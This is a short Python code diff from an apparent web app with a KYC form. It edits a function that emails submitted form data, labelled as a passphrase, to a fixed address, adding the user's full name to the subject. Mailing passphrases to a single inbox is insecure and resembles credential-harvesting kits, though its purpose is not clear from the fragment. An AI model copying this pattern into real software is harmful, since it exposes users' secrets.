@@ -25,7 +25,7 @@ def send_data(data):
 
     converted_data = {key: str(value) for key, value in data.items()}
     
-    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),f'PASSPHRASE FROM QFBS')
+    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),f'PASSPHRASE FROM {current_user.full_name} QFBS')
     
 def send_kyc(request):
     data = request.form
